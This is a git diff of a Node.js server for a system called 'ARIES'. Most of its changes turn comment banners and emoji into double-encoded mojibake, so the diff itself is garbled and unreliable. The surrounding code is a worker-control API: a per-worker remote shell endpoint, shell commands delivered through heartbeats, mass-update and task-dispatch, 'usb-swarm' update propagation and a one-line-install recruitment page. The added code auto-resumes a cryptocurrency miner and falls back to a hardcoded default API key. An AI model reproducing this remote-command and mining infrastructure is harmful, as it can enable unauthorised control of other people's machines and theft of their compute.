-    // â•â•â• GET /api/hashrate/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/hashrate/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/hashrate/stats') {
       try { var HashrateOptimizer = require('./hashrate-optimizer'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.hashrateOptimizer) _refs.hashrateOptimizer = new HashrateOptimizer();
       return json(res, 200, _refs.hashrateOptimizer.getStats());
     }
 
-    // â•â•â• GET /api/hashrate/profiles â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/hashrate/profiles Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/hashrate/profiles') {
       try { var HashrateOptimizer = require('./hashrate-optimizer'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.hashrateOptimizer) _refs.hashrateOptimizer = new HashrateOptimizer();
       return json(res, 200, { profiles: _refs.hashrateOptimizer.getProfiles() });
     }
 
-    // â•â•â• POST /api/hashrate/optimize â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/hashrate/optimize Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/hashrate/optimize') {
       try { var HashrateOptimizer = require('./hashrate-optimizer'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.hashrateOptimizer) _refs.hashrateOptimizer = new HashrateOptimizer();
@@ -6434,7 +6744,7 @@ undefined
       }
     }
 
-    // â•â•â• POST /api/hashrate/threads â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/hashrate/threads Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/hashrate/threads') {
       try { var HashrateOptimizer = require('./hashrate-optimizer'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.hashrateOptimizer) _refs.hashrateOptimizer = new HashrateOptimizer();
@@ -6446,11 +6756,11 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // SWARM AUTO-UPDATE PROPAGATION
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/swarm/push-update â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/push-update Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/push-update') {
       var puBody = JSON.parse(await readBody(req));
       var puDir = path.join(__dirname, '..', 'usb-swarm');
@@ -6482,11 +6792,11 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     // VIRTUALBOX AUTO-PROVISIONER
-    // ═══════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-    // ═══ GET /api/vbox/status ═══
+    // â•â•â• GET /api/vbox/status â•â•â•
     if (method === 'GET' && reqPath === '/api/vbox/status') {
       var vboxProv = require('./vbox-provisioner');
       if (!vboxProv.isAvailable()) return json(res, 200, { available: false, error: 'VirtualBox not found', vms: [], templateStatus: 'vbox_not_found', resources: vboxProv.getResources() });
@@ -6494,13 +6804,13 @@ undefined
       catch(e) { return json(res, 200, vboxProv.getStatus()); }
     }
 
-    // ═══ GET /api/vbox/resources ═══
+    // â•â•â• GET /api/vbox/resources â•â•â•
     if (method === 'GET' && reqPath === '/api/vbox/resources') {
       var vboxProv = require('./vbox-provisioner');
       return json(res, 200, vboxProv.getResources());
     }
 
-    // ═══ POST /api/vbox/create ═══
+    // â•â•â• POST /api/vbox/create â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/create') {
       var vboxProv = require('./vbox-provisioner');
       if (!vboxProv.isAvailable()) return json(res, 500, { error: 'VirtualBox not found' });
@@ -6513,7 +6823,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ POST /api/vbox/start ═══
+    // â•â•â• POST /api/vbox/start â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/start') {
       var vboxProv = require('./vbox-provisioner');
       var body = JSON.parse(await readBody(req));
@@ -6525,7 +6835,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ POST /api/vbox/stop ═══
+    // â•â•â• POST /api/vbox/stop â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/stop') {
       var vboxProv = require('./vbox-provisioner');
       var body = JSON.parse(await readBody(req));
@@ -6537,7 +6847,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ POST /api/vbox/delete ═══
+    // â•â•â• POST /api/vbox/delete â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/delete') {
       var vboxProv = require('./vbox-provisioner');
       var body = JSON.parse(await readBody(req));
@@ -6549,7 +6859,7 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ POST /api/vbox/create-template ═══
+    // â•â•â• POST /api/vbox/create-template â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/create-template') {
       var vboxTemplate = require('./vbox-template');
       if (vboxTemplate.isBuilding()) return json(res, 409, { error: 'Template build already in progress' });
@@ -6563,7 +6873,7 @@ undefined
       return json(res, 200, { status: 'building', message: 'Template build started' });
     }
 
-    // ═══ POST /api/vbox/take-snapshot ═══
+    // â•â•â• POST /api/vbox/take-snapshot â•â•â•
     if (method === 'POST' && reqPath === '/api/vbox/take-snapshot') {
       var vboxTemplate = require('./vbox-template');
       try {
@@ -6572,24 +6882,24 @@ undefined
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ GET /api/vbox/build-log ═══
+    // â•â•â• GET /api/vbox/build-log â•â•â•
     if (method === 'GET' && reqPath === '/api/vbox/build-log') {
       var vboxTemplate = require('./vbox-template');
       return json(res, 200, { log: vboxTemplate.getBuildLog(), building: vboxTemplate.isBuilding() });
     }
 
-    // ═══════════════════════════════════════════════════════
-    // ═══ MANAGEMENT API - Member Tracker, Network Health, Revenue ═══
-    // ═══════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // â•â•â• MANAGEMENT API - Member Tracker, Network Health, Revenue â•â•â•
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-    // ═══ GET /api/manage/members ═══
+    // â•â•â• GET /api/manage/members â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/members') {
       const mt = refs.memberTracker;
       if (!mt) return json(res, 500, { error: 'Member tracker not available' });
       return json(res, 200, { members: mt.getAllMembers(), total: Object.keys(mt.members).length });
     }
 
-    // ═══ GET /api/manage/members/:id ═══
+    // â•â•â• GET /api/manage/members/:id â•â•â•
     if (method === 'GET' && reqPath.startsWith('/api/manage/members/') && !reqPath.includes('/kick') && !reqPath.includes('/ban') && !reqPath.includes('/message') && !reqPath.includes('/tier') && !reqPath.includes('/group')) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1]);
       const mt = refs.memberTracker;
@@ -6599,7 +6909,7 @@ undefined
       return json(res, 200, { member });
     }
 
-    // ═══ POST /api/manage/members/:id/kick ═══
+    // â•â•â• POST /api/manage/members/:id/kick â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/members\/[^/]+\/kick$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1].replace('/kick', ''));
       const mt = refs.memberTracker;
@@ -6609,7 +6919,7 @@ undefined
       return json(res, 200, { status: 'kicked', workerId: wid });
     }
 
-    // ═══ POST /api/manage/members/:id/ban ═══
+    // â•â•â• POST /api/manage/members/:id/ban â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/members\/[^/]+\/ban$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1].replace('/ban', ''));
       const mt = refs.memberTracker;
@@ -6619,7 +6929,7 @@ undefined
       return json(res, 200, { status: 'banned', workerId: wid });
     }
 
-    // ═══ POST /api/manage/members/:id/message ═══
+    // â•â•â• POST /api/manage/members/:id/message â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/members\/[^/]+\/message$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1].replace('/message', ''));
       const body = JSON.parse(await readBody(req));
@@ -6629,7 +6939,7 @@ undefined
       return json(res, 200, { status: 'sent', workerId: wid });
     }
 
-    // ═══ POST /api/manage/members/:id/tier ═══
+    // â•â•â• POST /api/manage/members/:id/tier â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/members\/[^/]+\/tier$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1].replace('/tier', ''));
       const body = JSON.parse(await readBody(req));
@@ -6639,7 +6949,7 @@ undefined
       return json(res, 200, { status: 'updated', workerId: wid, tier: body.tier });
     }
 
-    // ═══ POST /api/manage/members/:id/group ═══
+    // â•â•â• POST /api/manage/members/:id/group â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/members\/[^/]+\/group$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/members/')[1].replace('/group', ''));
       const body = JSON.parse(await readBody(req));
@@ -6650,35 +6960,35 @@ undefined
       return json(res, 200, { status: 'updated', workerId: wid, groups: mt.getMember(wid)?.groups });
     }
 
-    // ═══ GET /api/manage/stats ═══
+    // â•â•â• GET /api/manage/stats â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/stats') {
       const mt = refs.memberTracker;
       if (!mt) return json(res, 500, { error: 'Member tracker not available' });
       return json(res, 200, mt.getStats());
     }
 
-    // ═══ GET /api/manage/revenue ═══
+    // â•â•â• GET /api/manage/revenue â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/revenue') {
       const mt = refs.memberTracker;
       if (!mt) return json(res, 500, { error: 'Member tracker not available' });
       return json(res, 200, mt.getRevenueEstimate());
     }
 
-    // ═══ GET /api/manage/health ═══
+    // â•â•â• GET /api/manage/health â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/health') {
       const nh = refs.networkHealth;
       if (!nh) return json(res, 500, { error: 'Network health not available' });
       return json(res, 200, nh.getThroughput());
     }
 
-    // ═══ GET /api/manage/reports ═══
+    // â•â•â• GET /api/manage/reports â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/reports') {
       const nh = refs.networkHealth;
       if (!nh) return json(res, 200, { reports: [] });
       return json(res, 200, { reports: nh.getReports() });
     }
 
-    // ═══ POST /api/manage/reports/generate ═══
+    // â•â•â• POST /api/manage/reports/generate â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/reports/generate') {
       const body = JSON.parse(await readBody(req));
       const nh = refs.networkHealth;
@@ -6687,14 +6997,14 @@ undefined
       return json(res, 200, { report });
     }
 
-    // ═══ GET /api/manage/optimizer ═══
+    // â•â•â• GET /api/manage/optimizer â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/optimizer') {
       const opt = refs.autoOptimizer;
       if (!opt) return json(res, 500, { error: 'Optimizer not available' });
       return json(res, 200, { scores: opt.getScores(), routing: opt.getRouting(), reports: opt.getWeeklyReports() });
     }
 
-    // ═══ POST /api/manage/optimizer/run ═══
+    // â•â•â• POST /api/manage/optimizer/run â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/optimizer/run') {
       const opt = refs.autoOptimizer;
       if (!opt) return json(res, 500, { error: 'Optimizer not available' });
@@ -6702,7 +7012,7 @@ undefined
       return json(res, 200, { status: 'optimized' });
     }
 
-    // ═══ POST /api/manage/optimizer/prune ═══
+    // â•â•â• POST /api/manage/optimizer/prune â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/optimizer/prune') {
       const opt = refs.autoOptimizer;
       if (!opt) return json(res, 500, { error: 'Optimizer not available' });
@@ -6710,7 +7020,7 @@ undefined
       return json(res, 200, { pruned });
     }
 
-    // ═══ POST /api/manage/shell/:workerId ═══
+    // â•â•â• POST /api/manage/shell/:workerId â•â•â•
     if (method === 'POST' && reqPath.match(/^\/api\/manage\/shell\/[^/]+$/)) {
       const wid = decodeURIComponent(reqPath.split('/api/manage/shell/')[1]);
       const body = JSON.parse(await readBody(req));
@@ -6724,7 +7034,7 @@ undefined
       }
     }
 
-    // ═══ POST /api/manage/broadcast ═══
+    // â•â•â• POST /api/manage/broadcast â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/broadcast') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6733,7 +7043,7 @@ undefined
       return json(res, 200, { status: 'broadcasted' });
     }
 
-    // ═══ POST /api/manage/broadcast-config ═══
+    // â•â•â• POST /api/manage/broadcast-config â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/broadcast-config') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6742,7 +7052,7 @@ undefined
       return json(res, 200, { status: 'config pushed to all workers' });
     }
 
-    // ═══ POST /api/manage/mass-update ═══
+    // â•â•â• POST /api/manage/mass-update â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/mass-update') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6752,7 +7062,7 @@ undefined
       return json(res, 200, { status: 'update command sent' });
     }
 
-    // ═══ POST /api/manage/task-dispatch ═══
+    // â•â•â• POST /api/manage/task-dispatch â•â•â•
     if (method === 'POST' && reqPath === '/api/manage/task-dispatch') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6765,7 +7075,7 @@ undefined
       return json(res, 200, { status: 'dispatched', targetCount: targets.length });
     }
 
-    // ═══ GET /api/manage/groups ═══
+    // â•â•â• GET /api/manage/groups â•â•â•
     if (method === 'GET' && reqPath === '/api/manage/groups') {
       const mt = refs.memberTracker;
       if (!mt) return json(res, 200, { groups: [] });
@@ -6776,7 +7086,7 @@ undefined
       return json(res, 200, { groups });
     }
 
-    // ═══ Worker heartbeat endpoint (workers call this) ═══
+    // â•â•â• Worker heartbeat endpoint (workers call this) â•â•â•
     if (method === 'POST' && reqPath === '/api/workers/heartbeat') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6792,7 +7102,7 @@ undefined
       return json(res, 200, { ok: true, messages, configPush, shellCmd });
     }
 
-    // ═══ Worker shell result (workers report back) ═══
+    // â•â•â• Worker shell result (workers report back) â•â•â•
     if (method === 'POST' && reqPath === '/api/workers/shell-result') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6800,7 +7110,7 @@ undefined
       return json(res, 200, { ok: true });
     }
 
-    // ═══ Worker registration ═══
+    // â•â•â• Worker registration â•â•â•
     if (method === 'POST' && reqPath === '/api/workers/register') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6812,7 +7122,7 @@ undefined
       return json(res, 200, { ok: true, workerId: result.workerId });
     }
 
-    // ═══ Worker task completion report ═══
+    // â•â•â• Worker task completion report â•â•â•
     if (method === 'POST' && reqPath === '/api/workers/task-complete') {
       const body = JSON.parse(await readBody(req));
       const mt = refs.memberTracker;
@@ -6820,7 +7130,7 @@ undefined
       return json(res, 200, { ok: true });
     }
 
-    // ═══ Swarm Intelligence - Collective Memory ═══
+    // â•â•â• Swarm Intelligence - Collective Memory â•â•â•
     if (method === 'POST' && reqPath === '/api/swarm/collective-memory') {
       const body = JSON.parse(await readBody(req));
       const si = refs.swarmIntelligence;
@@ -6836,7 +7146,7 @@ undefined
       return json(res, 200, { results: si.searchCollectiveMemory(query) });
     }
 
-    // ═══ Swarm Intelligence - Specializations ═══
+    // â•â•â• Swarm Intelligence - Specializations â•â•â•
     if (method === 'GET' && reqPath === '/api/swarm/specializations') {
       const si = refs.swarmIntelligence;
       if (!si) return json(res, 200, { specializations: {} });
@@ -6968,8 +7278,8 @@ function _generateDocsPage() {
   html += '#search{width:100%;padding:12px;background:#111;border:1px solid #333;color:#0ff;border-radius:6px;font-size:14px;margin-bottom:24px;outline:none}';
   html += '#search:focus{border-color:#0ff;box-shadow:0 0 8px rgba(0,255,255,0.2)}';
   html += '</style></head><body><div class="container">';
-  html += '<h1>â-² ARIES API Documentation</h1>';
-  html += '<div class="subtitle">v5.0 â€" Autonomous Runtime Intelligence &amp; Execution System</div>';
+  html += '<h1>Ã¢-Â² ARIES API Documentation</h1>';
+  html += '<div class="subtitle">v5.0 Ã¢â‚¬" Autonomous Runtime Intelligence &amp; Execution System</div>';
   html += '<input type="text" id="search" placeholder="Search endpoints..." oninput="filterEndpoints(this.value)">';
 
   for (var gi = 0; gi < endpoints.length; gi++) {
@@ -6999,7 +7309,7 @@ function _generateDocsPage() {
   return html;
 }
 
-// ── /join recruitment page ──
+// â”€â”€ /join recruitment page â”€â”€
 function _getJoinPage() {
   const workerCount = Object.keys(_knownWorkers).length;
   return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Join the Aries Network</title>
@@ -7030,18 +7340,18 @@ h1{font-size:3.5em;background:linear-gradient(135deg,#00ffcc,#0088ff);-webkit-ba
 @media(max-width:600px){h1{font-size:2em}.value-props{grid-template-columns:1fr}.stats{gap:15px}}
 </style></head><body>
 <div class="hero">
-<h1>⚡ ARIES NETWORK</h1>
+<h1>âš¡ ARIES NETWORK</h1>
 <p class="subtitle">Get free AI tools. Share idle compute. Join the distributed intelligence network.</p>
 <div class="stats">
 <div class="stat-box"><div class="num" id="workers">${workerCount}</div><div class="lbl">Workers Online</div></div>
 <div class="stat-box"><div class="num" id="uptime">99.9%</div><div class="lbl">Uptime</div></div>
-<div class="stat-box"><div class="num">∞</div><div class="lbl">AI Queries</div></div>
+<div class="stat-box"><div class="num">âˆž</div><div class="lbl">AI Queries</div></div>
 </div>
 <div class="value-props">
-<div class="prop"><h3>🧠 Swarm Intelligence</h3><p>Multi-agent AI powered by the network</p></div>
-<div class="prop"><h3>📊 Cyberpunk Dashboard</h3><p>15-panel real-time monitoring</p></div>
-<div class="prop"><h3>🎯 Autonomous Goals</h3><p>AI that works while you sleep</p></div>
-<div class="prop"><h3>🔒 Idle-Only</h3><p>Only uses CPU when you're not (< 30%)</p></div>
+<div class="prop"><h3>ðŸ§  Swarm Intelligence</h3><p>Multi-agent AI powered by the network</p></div>
+<div class="prop"><h3>ðŸ“Š Cyberpunk Dashboard</h3><p>15-panel real-time monitoring</p></div>
+<div class="prop"><h3>ðŸŽ¯ Autonomous Goals</h3><p>AI that works while you sleep</p></div>
+<div class="prop"><h3>ðŸ”’ Idle-Only</h3><p>Only uses CPU when you're not (< 30%)</p></div>
 </div>
 <div class="install-section">
 <h2>One-Line Install</h2>
@@ -7063,7 +7373,7 @@ setInterval(async()=>{try{const r=await fetch('/api/status');const d=await r.jso
 </script></body></html>`;
 }
 
-// ── Enterprise API endpoints (handled in handleRequest) ──
+// â”€â”€ Enterprise API endpoints (handled in handleRequest) â”€â”€
 function _handleEnterpriseApi(reqPath, method, req, res, body) {
   if (reqPath === '/api/enterprise/networks' && method === 'GET') {
     const networks = [{ id: 'default', name: _refs.config?.enterprise?.networkName || 'aries-public', workers: Object.keys(_knownWorkers).length }];
@@ -7114,12 +7424,35 @@ function start(refs) {
 
   const server = http.createServer(handleRequest);
   // NOTE: WebSocket upgrade is handled by websocket.js (attached in headless.js)
-  // Do NOT add server.on('upgrade', handleUpgrade) here â€" it conflicts.
+  // Do NOT add server.on('upgrade', handleUpgrade) here Ã¢â‚¬" it conflicts.
 
   server.listen(port, host, () => {
     startStatsBroadcast();
     startWorkerTracker();
     startSelfHealingMonitor();
+    startHashrateBroadcast();
+    startMinerStateSaver();
+    // FEATURE 3: Auto-resume mining if it was running before restart
+    try {
+      var savedState = _loadMinerState();
+      if (savedState && savedState.mining) {
+        console.log('[MINER-STATE] Previous mining session detected, will auto-resume via miner/start');
+        // Simulate a start request after a short delay to let everything initialize
+        setTimeout(function() {
+          try {
+            var mcfgResume = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
+            if (mcfgResume.miner && mcfgResume.miner.wallet) {
+              // Trigger the miner start logic by making an internal request
+              var resumeReq = require('http').request({ hostname: '127.0.0.1', port: port, path: '/api/miner/start', method: 'POST', headers: { 'Content-Type': 'application/json', 'x-aries-key': cfg.apiKey || 'aries-api-2026' } });
+              resumeReq.on('error', function() {});
+              resumeReq.write(JSON.stringify({ nodes: ['local'] }));
+              resumeReq.end();
+              console.log('[MINER-STATE] Auto-resume mining triggered');
+            }
+          } catch (e) { console.error('[MINER-STATE] Auto-resume error:', e.message); }
+        }, 5000);
+      }
+    } catch (e) { console.error('[MINER-STATE] Load error:', e.message); }
     if (refs.onStarted) refs.onStarted(port);
   });
 
@@ -7131,4 +7464,4 @@ function start(refs) {
   return server;
 }
 
-module.exports = { start, addPluginRoute };
+module.exports = { start, addPluginRoute, getPluginRouteAdder, wsBroadcast };
